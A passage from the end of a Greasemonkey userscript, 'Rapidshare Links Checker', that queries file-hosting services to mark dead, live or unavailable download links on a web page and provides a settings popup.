									matchArrayff[1] = "http://www.filefactory.com/file/" + matchArrayff[1];
									fotfoundlinks.push(matchArrayff[1]);
								}
								if (fotfoundlinks) {
									DiplayTheDeletedLinks(fotfoundlinks);
								}
							}
							if (livelink) {
								var livelinklinks = new Array();
								var livelinklinksplus = new Array();
								for (var i = livelink.length - 1; i >= 0; i--) {
									var string = livelink[i];
									var regex2 = /<div class="metadata">http:\/\/www.filefactory.com\/file\/(.*?)\/n\/(.*?)<\/div>\n<\/td>\n<td>(.*?)<\/td>/; //var regex2 = /<tr valign='top' style='color:green;'><td>(.*?)<\/td><td style="text-align:right;">(.*?)<\/td><td style="text-align:right;">Valid<\/td><td style="text-align:right;"><a href="http:\/\/www.filefactory.com\/file\/(.*?)\/n\/.*?" title="Go to the file download page">View Page/;
									matchArraylive = string.match(regex2);
									livelinklinks.push(matchArraylive[1]);
									livelinklinksplus.push('+%%+id=' + matchArraylive[1] + '+%%+size=' + matchArraylive[3] + '+%%+name=' + matchArraylive[2] + '+%%+##');
								}
								if (livelinklinksplus) {
									DiplayTheMULiveLinks(livelinklinksplus);
								} 
							}
						}
					});
				}
			},
			1);
		}
		function getnllinkschecked(all) {
			window.setTimeout(function() { 
				// can check 100 links per time
				// can check 10000 Bites of links so all.join('\n').length <= 10000
				for (var i = all.length - 1; i >= 0; i--) { //_log('all.join.length '+all.join('\n').length);  

					GM_xmlhttpRequest({
					  method: "POST",
					  url: "http://api.netload.in/index.php\?id=2",
					  data: "links="+escape(all[i])+"&send=Absenden",
					  headers: {
						"Content-Type": "application/x-www-form-urlencoded"
					  },
					  onload: function(result) {				
							res = result.responseText;		  
							res = res.replace(/\r\n/g, ''); 
							res = res.replace(/\n/g, ' '); 
							res = res.replace(/<\/textarea>/g, ' </textarea>');
							livelink = res.match(/<h3 style="color: green;">Online<\/h3><textarea style="width: 100%; height: 150px;" name="links">(.*?) <\/textarea> /g); 
							notfound = res.match(/<h3 style="color: red;">Offline<\/h3><textarea style="width: 100%; height: 150px;" name="links">(.*?) <\/textarea>/g); 
							if (livelink) {livelink = livelink.join("");
							livelink = livelink.match(/http:\/\/.*? /g); 
							}
							if (notfound) {notfound = notfound.join("");
							notfound = notfound.match(/http:\/\/.*? /g); 
							}
							
							
							
							if (notfound) {
								var fotfoundlinks = new Array();
								for (var i = notfound.length - 1; i >= 0; i--) {
									var string = notfound[i];
									//var regex = /<div class="metadata">http:\/\/www.filefactory.com\/file\/(.*?)<\/div>\n<\/li>/; //var regex = /<td>File &quot;(.*?)&quot; does not exist<\/td><td style="text-align:right;">0 B<\/td><td style="text-align:right;">Invalid/;
									var regex = /(http:\/\/.*?) /; 
									//var regex = /<td>File &quot;(.*?)&quot; does not exist<\/td><td style="text-align:right;">0 B<\/td><td style="text-align:right;">Invalid/;
									matchArrayff = string.match(regex);
									//matchArrayff[1] = "http://www.filefactory.com/file/" + matchArrayff[1];
									fotfoundlinks.push(matchArrayff[1]);
								}
								if (fotfoundlinks) {
									DiplayTheDeletedLinks(fotfoundlinks);
								}
							}
							
							if (livelink) {
								var livelinklinks = new Array();
								var livelinklinksplus = new Array();
								for (var i = livelink.length - 1; i >= 0; i--) {
									var string = livelink[i];
									//var regex2 = /<div class="metadata">http:\/\/www.filefactory.com\/file\/(.*?)\/n\/(.*?)<\/div>\n<\/td>\n<td>(.*?)<\/td>/; //var regex2 = /<tr valign='top' style='color:green;'><td>(.*?)<\/td><td style="text-align:right;">(.*?)<\/td><td style="text-align:right;">Valid<\/td><td style="text-align:right;"><a href="http:\/\/www.filefactory.com\/file\/(.*?)\/n\/.*?" title="Go to the file download page">View Page/;
									var regex2 = /(http:\/\/.*?) /;
									matchArraylive = string.match(regex2);
									livelinklinks.push(matchArraylive[1]);
									livelinklinksplus.push('+%%+id=' + matchArraylive[1] + '+%%+size=' + matchArraylive[3] + '+%%+name=' + matchArraylive[2] + '+%%+##');
								}
								if (livelinklinksplus) {
									DiplayTheMULiveLinks(livelinklinksplus);
								} 
							}
						}
					});
				}
			},
			1);
		}	
		function getmulinkschecked(allmu) {
			for (var i = allmu.length - 1; i >= 0; i--) { // can check 10000 Bites of links so all.join('\n').length <= 10000
				datas = allmu[i];
				window.setTimeout(function() {
					GM_xmlhttpRequest({
						method: "post",
						url: 'http://megaupload.com/mgr_linkch' + 'eck.php',
						headers: {
							"Content-type": "text/html"
						},
						data: datas,
						onload: function(result) {
							res = result.responseText;
							res = res.replace(/\d=www.megaupload.com&\d=www.megaporn.com/, '');
							var recieved = new Array();
							recieved = res.split('&id');
							var pagelinks = new Array();
							pagelinks = datas.split('id');
							var alltogethernow = new Array();
							for (var y = recieved.length - 1; y >= 0; y--) {
								pagelinks[y] = 'file' + pagelinks[y];
								alltogethernow.push(pagelinks[y] + '=' + recieved[y]);
							}
							alltogethernowstr = alltogethernow.join('+');
							livelink = alltogethernowstr.match(/file\d{1,}=(........)(?:&|)=\d{1,}=0&s=(\d*)&d=\d&n=(.*?)\+/g);
							notfound = alltogethernowstr.match(/file\d{1,}=(........)(?:&|)=\d{1,}=1/g);
							tempanav = alltogethernowstr.match(/file\d{1,}=(........)(?:&|)=\d{1,}=3/g);
							if (notfound) {
								var fotfoundlinks = new Array();
								for (var i = notfound.length - 1; i >= 0; i--) {
									var string = notfound[i];
									var regex = /file\d{1,}=(........)(?:&|)=\d{1,}=1/;
									matchArray = string.match(regex);
									fotfoundlinks.push(matchArray[1]);
								}
								if (fotfoundlinks) {
									DiplayTheDeletedLinks(fotfoundlinks);
								}
							}
							if (tempanav) {
								var tempanavlinklinks = new Array();
								for (var i = tempanav.length - 1; i >= 0; i--) {
									var string = tempanav[i];
									var regex = /file\d{1,}=(........)(?:|&)=\d{1,}=3/;
									matchArray = string.match(regex);
									tempanavlinklinks.push(matchArray[1]);
								}
								if (tempanavlinklinks) {
									DiplayTheTempAvailableLinks(tempanavlinklinks);
								}
							}
							if (livelink) {
								var livelinklinks = new Array();
								var livelinklinksplus = new Array();
								for (var i = livelink.length - 1; i >= 0; i--) {
									var string = livelink[i];
									var regex = /file\d{1,}=(........)(?:&|)=\d{1,}=0&s=(\d*)&d=\d&n=(.*?)\+/;
									matchArray = string.match(regex);
									livelinklinks.push(matchArray[1]);
									livelinklinksplus.push('+%%+id=' + matchArray[1] + '+%%+size=' + matchArray[2] + '+%%+name=' + matchArray[3] + '+%%+##');
								}
								if (livelinklinksplus) {
									DiplayTheMULiveLinks(livelinklinksplus);
								} //if (livelinklinks){
								//DiplayTheLiveLinks(livelinklinks);
								//}
							}
						}
					});
				},
				1);
			}
		}
		function DiplayTheDeletedLinksApi(fotfoundlinks) {
			var xpathoffotfoundlinks = "//a[contains(@href,\'" + fotfoundlinks.join('\') or contains(@href,\'') + "\')]";
			var allLinks, thisLink;
			allLinks = document.evaluate(xpathoffotfoundlinks, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			for (var i = 0; i < allLinks.snapshotLength; i++) {
				var thisLink = allLinks.snapshotItem(i);
				//if (Show_black_backround_in_dead_links == 'yes') {
					if (Show_black_backround_in_dead_links) {
					thisLink.style.backgroundColor = 'Black';
					thisLink.style.color = 'Azure';
					 }

					if (Show_line_through_in_dead_links) {
					thisLink.style.textDecoration = 'line-through';
					 }
					if (! (thisLink.href.match(/(google|search%3Fq%3D|search\?q=)/))) {
					thisLink.id = "adead_link";
					 }
					if (No_live_links) {	
					delinkify(allLinks.snapshotItem(i), thisLink.id);
					 }
			}
			// another way slower 
			// var links = document.getElementsByTagName('a');
			//  for (var i = links.length - 1; i >= 0; i--) {
			// 	 if ( (links[i].href.indexOf("rapidshare.de/files/") != -1) || (links[i].href.indexOf("rapidshare.com/files/") != -1) || (links = fotfoundlinks)) {	
			//   
			// 
			//      for (var k = 0; k < fotfoundlinks.length; k++){
			//     	if (links[i] == fotfoundlinks[k]){
			//     	links[i].appendChild(document.createTextNode(' NOT FOUND'));
			//    		// OR 
			//    		links[i].style.fontStyle = 'italic';
			//    		                                 }
			//                                    }
			//    	                        }
			//                      }
		}
		
		function DiplayTheDeletedLinks(fotfoundlinks) {
			var xpathoffotfoundlinks = "//a[contains(@href,\'" + fotfoundlinks.join('\') or contains(@href,\'') + "\')]";
			var allLinks, thisLink;
			allLinks = document.evaluate(xpathoffotfoundlinks, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			for (var i = 0; i < allLinks.snapshotLength; i++) {
				var thisLink = allLinks.snapshotItem(i);
				if (Show_black_backround_in_dead_links) {
					thisLink.style.backgroundColor = 'Black';
					thisLink.style.color = 'Azure';
				}
					if (Show_line_through_in_dead_links) {
					thisLink.style.textDecoration = 'line-through';
				}
					if (! (thisLink.href.match(/(google|search%3Fq%3D|search\?q=)/))) {
					thisLink.id = 'adead_link';
				}
					if (No_live_links) {	
					delinkify(allLinks.snapshotItem(i), thisLink.id);
				}
			} // another way slower 
			// var links = document.getElementsByTagName('a');
			//  for (var i = links.length - 1; i >= 0; i--) {
			// 	 if ( (links[i].href.indexOf("rapidshare.de/files/") != -1) || (links[i].href.indexOf("rapidshare.com/files/") != -1) || (links = fotfoundlinks)) {	
			//   
			// 
			//      for (var k = 0; k < fotfoundlinks.length; k++){
			//     	if (links[i] == fotfoundlinks[k]){
			//     	links[i].appendChild(document.createTextNode(' NOT FOUND'));
			//    		// OR 
			//    		links[i].style.fontStyle = 'italic';
			//    		                                 }
			//                                    }
			//    	                        }
			//                      }
		}
		function DiplayTheMULiveLinks(livelinklinksplus) {
			var mylivelinklinksplusString = new String(livelinklinksplus);
			var livelinklinksplussplited = new Array();
			livelinklinksplussplited = mylivelinklinksplusString.split('##');
			for (var i = 0; i < (livelinklinksplussplited.length - 1); i++) {
				var matchArrayidmu = new Array();
				var regexid = /\+%%\+id=(.*?)\+%%\+/;
				matchArrayidmu = livelinklinksplussplited[i].match(regexid);
				var regexsizenumber = /\+%%\+size=(\d{1,})\+%%\+/;
				var regexsize = /\+%%\+size=(.*?)\+%%\+/;
				if (livelinklinksplussplited[i].match(regexsizenumber)) {
					var matchArraysize = livelinklinksplussplited[i].match(regexsizenumber);
					var size = matchArraysize[1];
					var size2 = (parseFloat(size) / 1048576); // 1024 * 1024 = 1048576
					var mbsize = (Math.round(size2*100) / 100) + ' MB' + ' (' + size + ' bytes)';
				} else if (livelinklinksplussplited[i].match(regexsize)) {
					var matchArraysize = livelinklinksplussplited[i].match(regexsize);
					var mbsize = matchArraysize[1];
				} else {
					var mbsize = 'unknown';
				}
				var regexname = /\+%%\+name=(.*?)\+%%\+/;
				var matchArrayname = livelinklinksplussplited[i].match(regexname);
				var xpathofalivelinklinks = "//a[contains(@href,\'" + matchArrayidmu[1] + "\')]";
				var muallLinks, muthisLink;
				muallLinks = document.evaluate(xpathofalivelinklinks, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
				for (var y = 0; y < muallLinks.snapshotLength; y++) {
					var muthisLink = muallLinks.snapshotItem(y);
					if (! (muthisLink.href.match(/(google|search%3Fq%3D|search\?q=)/))) {
						muthisLink.id = 'alive_link';
						if (! (muthisLink.href.match(/netload/)) ) {
						muthisLink.title = "Name: " + matchArrayname[1] + "\r\n Size: " + mbsize;
						}//else{
							//console.log(muthisLink.href);
						//muthisLink.title = "name:"+muthisLink.href.match(/.*\/(.*$)/)[1];
							//}
						//Remove_html_from_rapidshare_urls = true;
						if ( (muthisLink.href.match(/rapidshare.*?html$/)) && (Remove_html_from_rapidshare_urls) ) {
							muthisLink.href = muthisLink.href.replace(/\.html$/,'');
							muthisLink.textContent = muthisLink.href.replace(/\.html$/,'');
					   }
						
						
					}
					if (No_live_links) {
						delinkify(muallLinks.snapshotItem(y), muthisLink.id);
					}
				}
			}
		} // rapidshare only
		function DiplayTheLiveLinksApi(livelinklinks) {
			var xpathoflivelinklinks = "//a[contains(@href,\'" + livelinklinks.join('\') or contains(@href,\'') + "\')]"; //var xpathoflivelinklinks = "//a[contains(@href,\'" + livelinklinks.join('\') or contains(@href,\'') +"\') and not(contains(@href,'google'))]";
			var allliveLinks, thisLink;
			
			allliveLinks = document.evaluate(xpathoflivelinklinks, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			   rslivexpath = xpathoflivelinklinks;
							 
			for (var i = 0; i < allliveLinks.snapshotLength; i++) {
				var thisLink = allliveLinks.snapshotItem(i);
				if (! (thisLink.href.match(/(google|search%3Fq%3D|search\?q=)/))) // {
				{
					thisLink.id = 'alive_link'; 				
				}
				if (No_live_links) {
					delinkify(allliveLinks.snapshotItem(i), thisLink.id);
				}
			}
		}	
		function DiplayTheLiveLinks(livelinklinks) {
			var xpathoflivelinklinks = "//a[contains(@href,\'" + livelinklinks.join('\') or contains(@href,\'') + "\')]"; //var xpathoflivelinklinks = "//a[contains(@href,\'" + livelinklinks.join('\') or contains(@href,\'') +"\') and not(contains(@href,'google'))]";
			var allliveLinks, thisLink;
			
			allliveLinks = document.evaluate(xpathoflivelinklinks, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			   rslivexpath = xpathoflivelinklinks;
							 
			for (var i = 0; i < allliveLinks.snapshotLength; i++) {
				var thisLink = allliveLinks.snapshotItem(i);
				if (! (thisLink.href.match(/(google|search%3Fq%3D|search\?q=)/))) // {
				{
					thisLink.id = 'alive_link'; 
				}
				if (No_live_links) {
					delinkify(allliveLinks.snapshotItem(i), thisLink.id);
				}
			}
		}
		
		Array.prototype.exists = function(search) {
			for (var i = 0; i < this.length; i++)
				if (this[i] == search)
					return true;
			return false;
		}
		
		function DiplayTheTempAvailableLinks(tempanavlinklinks) {
			var xpathoftempanavlinklinks = "//a[contains(@href,\'" + tempanavlinklinks.join('\') or contains(@href,\'') + "\')]";
			var allliveLinks, thisLink;
			allliveLinks = document.evaluate(xpathoftempanavlinklinks, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			for (var i = 0; i < allliveLinks.snapshotLength; i++) {
				var thisLink = allliveLinks.snapshotItem(i);
				if (! (thisLink.href.match(/(google|search%3Fq%3D|search\?q=)/))) {
					thisLink.id = 'unava_link';
				}
				if (No_live_links) {
					delinkify(allliveLinks.snapshotItem(i), thisLink.id);
				}
			}
		}
		
		function delinkify(the_link, the_id) {
			var xpathofalive_link_id = "//a[contains(@href,'" + the_link + "')]";		
			var allliveLinks_id, thisLink_id;		
			allliveLinks_id = document.evaluate(xpathofalive_link_id, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			
			for (var i = 0; i < allliveLinks_id.snapshotLength; i++) {
				var thisLink_id = allliveLinks_id.snapshotItem(i);
				var span = document.createElement("span");
				span.id = the_id;
				span.innerHTML = thisLink_id.href;
				/*
				console.log(thisLink_id.innerHTML);
						if ( (!thisLink_id.innerHTML.match(/rapidshare\.com\/fil/)) && (!thisLink_id.innerHTML.match(/filefactory\.com\/fil/)) && (!thisLink_id.innerHTML.match(/megaupload\.com\/(?:|..\/)\?d\=.{8}/)) && (!thisLink_id.innerHTML.match(/megarotic\.com\/(?:|..\/)\?d\=.{8}/))  && (!location.href.match(/google/))) {
							var spantitle = document.createElement("span");
							spantitle.id = "title";
							spantitle.setAttribute('style', 'font-weight:bold');
							spantitle.innerHTML += thisLink_id.innerHTML; 
							
							//spantitle.innerHTML += '\n';
							var br = document.createElement("br");
							thisLink_id.parentNode.insertBefore(spantitle, thisLink_id);
							thisLink_id.parentNode.insertBefore(br, thisLink_id);
						}
				* */
				thisLink_id.parentNode.insertBefore(span, thisLink_id);
				thisLink_id.parentNode.removeChild(thisLink_id);
			}
		}
		if (Display_Page_Stats) {
			var now = new Date(); 
			var lasttime = now.getTime();
			var numberoflinks = numberofrslinks + numberoffflinks + numberofmulinks + numberofnllinks;
			var runningtime = lasttime - firsttime;
			if (numberoflinks > 0) {
				GM_log('Rapidshare Links Checker\r\nRunning time in seconds: ' + (runningtime / 1000) + '\r\nRunning time in milliseconds: ' + runningtime + '\r\nNumber of links: ' + numberoflinks + '\r\nPage: ' + document.title + '\r\nLocation: ' + document.location);
			}
		}
	}

	function Check_The_Links_In_This_Page(){
		check(Send_the_urls_of_the_pages_you_are_checking_in_the_open_database,Show_black_backround_in_dead_links,Show_line_through_in_dead_links,Remove_html_from_rapidshare_urls,No_live_links,Display_Page_Stats,Destyling_google_cache,firsttime);
	}
	if(Autocheck_links_on_page_load) Check_The_Links_In_This_Page();

	if(Add_menu_commands) GM_registerMenuCommand("[Rapidshare Links Checker] Check The Links In This Page", Check_The_Links_In_This_Page, "w", "shift alt", "q");

	function closeConfigurationBox(){
		configurationBox = document.getElementById('hideshow');
		configurationBox.parentNode.removeChild(configurationBox);
	}

	function configuration(){
		var  configcss = '\
		#h3hideshowtitle{\
		 font-size: 2em;\
		}\
		#h3hideshow{\
		 font-size: 1.5em;\
		}\
		#imghideshow {\
		 border: none;\
		}\
		#plusimage{\
			display:inline;\
			}\
		#hideshow {\
		 position: fixed;\
		 width: 100%;\
		 height: 100%;\
		 top: 0;\
		 left: 0;\
		 font-size:12px;\
		 z-index:211;\
		 text-align:left;\
		}\
		#fade {\
		 background: #000;\
		 position: fixed;\
		 width: 100%;\
		 height: 100%;\
		 opacity: .80;\
		 -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=80)";\
		 left: 0;\
		 z-index: 10;\
		}\
		.popup_block {\
		 color:black;\
		 background: #ddd;\
		 padding: 10px 20px;\
		 border: 10px solid #fff;\
		 float: left;\
		 width: 480px;\
		 position: absolute;\
		 top: 2%;\
		 left: 50%;\
		 margin: 0 0 0 -250px;\
		 z-index: 100;\
		\
		}\
		.popup_block .popup {\
		 float: left;\
		 width: 100%;\
		 background: #fff;\
		 margin: 10px 0;\
		 padding: 10px 0;\
		 border: 1px solid #bbb;\
		}\
		.popup h3 {\
		 margin: 0 0 20px;\
		 padding: 5px 10px;\
		 border-bottom: 1px solid #bbb;\
		 font-size: 1.5em;\
		 font-weight: normal;\
		}\
		.popup p {\
		 padding: 5px 10px;\
		 margin: 5px 0;\
		}\
		.popup img.cntrl {\
		 position: absolute;\
		 right: -20px;\
		 top: -20px;\
		}\
		';

		GM_addStyle(configcss);

		function makecheckbox(id) {
			checkbo_x = "<input_type='checkbox'_class_='checkboxconfig'_value='"+id+"'_name='"+id+"'_id='"+id+"'/>"; //false
			return checkbo_x;
		}

		//close image and css taken from = http://www.sohtanaka.com/web-design/examples/css-popup    icon_close.png;
		var  configurationinnerHTML = '\
		  <div id="fade"></div>\
		  <div class="popup_block">\
			<div class="popup">\
				<a href="#"><img id="imghideshow" title="Close" class="cntrl" src="data:image/png;base64,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%3D%3D"/></a>\
			<h3 id="h3hideshowtitle">Rapidshare Links Checker UserJS Config.</h3>\
			<h3 id="h3hideshow">Settings</h3>\
				<p><span id="Autocheck_links_on_page_load"></span> </p>\
				<p><span id="Display_Page_Stats"></span> </p>\
			<h3 id="h3hideshow">Links Styling</h3>\
				<p><span id="No_live_links"></span> </p>\
				<p><span id="Destyling_google_cache"></span></p>\
				<p><span id="Show_black_backround_in_dead_links"></span></p>\
				<p><span id="Show_line_through_in_dead_links"></span></p>\
				<p><span id="Remove_html_from_rapidshare_urls"></span></p>\
			<h3 id="h3hideshow">Rapidshare Links Database</h3>\
				<p> The rapidshare database (<a href="http://hosts.890m.com">http://hosts.890m.com</a>) is a part of this userscript,\
		 the Rapidshare Links Checker userscript has the ability to sent only the urls of\
		 the pages when all the rapidshare links are alive, no cookies or other private\
		 informations are sent to the database, and you are able to erase the data you send.</p>\
				<p><span id="Send_the_urls_of_the_pages_you_are_checking_in_the_open_database"></p>\
			</div>\
		</div>\
		\
		\
		';

		var divhideshow = document.createElement("div");
		divhideshow.id = "hideshow";
		divhideshow.setAttribute('style', 'visibility: visible;');
		divhideshow.innerHTML = configurationinnerHTML;
		document.body.appendChild(divhideshow);

		var imgClose=document.getElementById("imghideshow");

		imgClose.addEventListener("click", closeConfigurationBox, false);

		function changeConfiguration(e){
			if(eval(e.target.id)){
				GM_setValue(e.target.id, false);
				var result= 'disabled';
			}else{
				GM_setValue(e.target.id, true);
				var result= 'enabled';
			}
			set_variables();
			alert(e.target.id.replace(/_/g,' ') + ' is ' + result + '.');
		}

		var existingobject = divhideshow.getElementsByTagName("span");
		
		for (var i = existingobject.length - 1; i >= 0; i--) {
			if (eval(existingobject[i].id)){
				var addition = "checked='checked'";
				}else{
				var addition = "";
				};
					
			existingobject[i].innerHTML =  "<input type='checkbox' class='checkboxconfig' "+addition+"' name='"+existingobject[i].id+"' id='"+existingobject[i].id+"'/>"+existingobject[i].id.replace(/_/g,' ');
			existingobject[i].innerHTML = existingobject[i].innerHTML.replace(/Remove html /,'Remove .html ');
			document.getElementById(existingobject[i].id).addEventListener("click", changeConfiguration, false);
		}
	}

	if(Add_menu_commands) GM_registerMenuCommand("[Rapidshare Links Checker] Configuration", configuration, null, null, "R");

	function makeTheCheckedLinksToFullURl(){
		var alive_links = document.getElementsByTagName('a');	
		  for (var i = 0; i < alive_links.length; i++) {
			   if (alive_links[i].id == 'alive_link'){
				alive_links[i].innerHTML = alive_links[i].href; 
				}
		  }
	}

	if(Add_menu_commands) GM_registerMenuCommand("[Rapidshare Links Checker] Make The Links To Full Urls", makeTheCheckedLinksToFullURl, "w", "control alt", "w");
})();